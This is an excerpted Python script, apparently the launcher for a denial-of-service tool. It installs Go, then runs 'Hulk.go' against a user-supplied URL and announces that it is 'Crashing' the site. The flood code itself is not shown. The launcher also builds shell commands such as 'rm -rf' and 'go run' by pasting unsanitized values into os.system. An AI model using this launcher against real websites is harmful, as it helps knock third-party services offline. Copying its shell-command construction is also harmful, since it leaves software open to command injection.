...
def install_go():
    go_dir = os.path.expanduser('~/.local/go')
    if os.path.isdir(go_dir) and os.path.isfile(os.path.join(go_dir, 'bin', 'go')):
        os.environ['PATH'] = os.path.join(go_dir, 'bin') + ':' + os.environ.get('PATH', '')
        return
    arch = 'amd64'
    if os.uname().machine == 'aarch64':
        arch = 'arm64'
    url = f'https://go.dev/dl/go1.22.5.linux-{arch}.tar.gz'
    tmp = '/tmp/go.tar.gz'
    ...
    if not os.path.isfile(tmp) or os.path.getsize(tmp) < 1000000:
        ...
        sys.exit(1)
    print(f'\x1b[38;2;255;165;0m[ ... ] Extracting...')
    os.makedirs(os.path.dirname(go_dir), exist_ok=True)
    if os.path.isdir(go_dir):
        os.system(f'rm -rf {go_dir}')
    os.system(f'tar -xzf {tmp} -C {os.path.dirname(go_dir)}')
    os.remove(tmp)
    os.environ['PATH'] = os.path.join(go_dir, 'bin') + ':' + os.environ.get('PATH', '')
    print(f'\x1b[38;2;0;255;0m[ ✓ ] Go installed successfully!')
...
if len(sys.argv) > 1:
    ...
    ensure_go()
    print(f'\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mCrashing {url} with {method}...')
    os.system(f'go run Hulk.go -site {url} -data {method}')
else:
    login()
